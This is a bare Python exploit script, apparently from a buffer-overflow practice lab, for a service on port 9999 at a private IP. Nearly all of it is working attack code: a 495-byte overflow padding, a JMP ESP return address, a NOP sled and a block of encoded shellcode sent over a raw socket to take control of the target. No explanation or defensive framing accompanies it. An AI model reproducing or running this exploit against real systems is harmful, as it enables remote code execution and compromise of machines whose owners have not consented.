import socket
import pwn

shellcode =  b""
shellcode += b"\xbf\xc4\x49\xa9\x41\xda\xdc\xd9\x74\x24\xf4"
shellcode += b"\x5e\x2b\xc9\xb1\x52\x83\xee\xfc\x31\x7e\x0e"
shellcode += b"\x03\xba\x47\x4b\xb4\xbe\xb0\x09\x37\x3e\x41"
shellcode += b"\x6e\xb1\xdb\x70\xae\xa5\xa8\x23\x1e\xad\xfc"
shellcode += b"\xcf\xd5\xe3\x14\x5b\x9b\x2b\x1b\xec\x16\x0a"
shellcode += b"\x12\xed\x0b\x6e\x35\x6d\x56\xa3\x95\x4c\x99"
shellcode += b"\xb6\xd4\x89\xc4\x3b\x84\x42\x82\xee\x38\xe6"
shellcode += b"\xde\x32\xb3\xb4\xcf\x32\x20\x0c\xf1\x13\xf7"
shellcode += b"\x06\xa8\xb3\xf6\xcb\xc0\xfd\xe0\x08\xec\xb4"
shellcode += b"\x9b\xfb\x9a\x46\x4d\x32\x62\xe4\xb0\xfa\x91"
shellcode += b"\xf4\xf5\x3d\x4a\x83\x0f\x3e\xf7\x94\xd4\x3c"
shellcode += b"\x23\x10\xce\xe7\xa0\x82\x2a\x19\x64\x54\xb9"
shellcode += b"\x15\xc1\x12\xe5\x39\xd4\xf7\x9e\x46\x5d\xf6"
shellcode += b"\x70\xcf\x25\xdd\x54\x8b\xfe\x7c\xcd\x71\x50"
shellcode += b"\x80\x0d\xda\x0d\x24\x46\xf7\x5a\x55\x05\x90"
shellcode += b"\xaf\x54\xb5\x60\xb8\xef\xc6\x52\x67\x44\x40"
shellcode += b"\xdf\xe0\x42\x97\x20\xdb\x33\x07\xdf\xe4\x43"
shellcode += b"\x0e\x24\xb0\x13\x38\x8d\xb9\xff\xb8\x32\x6c"
shellcode += b"\xaf\xe8\x9c\xdf\x10\x58\x5d\xb0\xf8\xb2\x52"
shellcode += b"\xef\x19\xbd\xb8\x98\xb0\x44\x2b\xad\x4f\x65"
shellcode += b"\x38\xd9\x4d\x69\x2f\x46\xdb\x8f\x25\x66\x8d"
shellcode += b"\x18\xd2\x1f\x94\xd2\x43\xdf\x02\x9f\x44\x6b"                                                                                               
shellcode += b"\xa1\x60\x0a\x9c\xcc\x72\xfb\x6c\x9b\x28\xaa"                                                                                               
shellcode += b"\x73\x31\x44\x30\xe1\xde\x94\x3f\x1a\x49\xc3"                                                                                               
shellcode += b"\x68\xec\x80\x81\x84\x57\x3b\xb7\x54\x01\x04"                                                                                                                              
shellcode += b"\x73\x83\xf2\x8b\x7a\x46\x4e\xa8\x6c\x9e\x4f"                                                                                                                              
shellcode += b"\xf4\xd8\x4e\x06\xa2\xb6\x28\xf0\x04\x60\xe3"                                                                                                                              
shellcode += b"\xaf\xce\xe4\x72\x9c\xd0\x72\x7b\xc9\xa6\x9a"
shellcode += b"\xca\xa4\xfe\xa5\xe3\x20\xf7\xde\x19\xd1\xf8"
shellcode += b"\x35\x9a\xf1\x1a\x9f\xd7\x99\x82\x4a\x5a\xc4"
shellcode += b"\x34\xa1\x99\xf1\xb6\x43\x62\x06\xa6\x26\x67"
shellcode += b"\x42\x60\xdb\x15\xdb\x05\xdb\x8a\xdc\x0f"

jmp_esp = 0x311712F3 #0x7BCCE5D9
offset = 495
buffer = b"A" * offset + pwn.p32(jmp_esp) + b"\x90" * 32 + shellcode

target = '10.10.92.146'
#target = '127.0.0.1'
port = 9999

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target, port))
    s.send((b"                          >> " + buffer))
    s.close()
except:
    print(f"Error connecting to the server...")
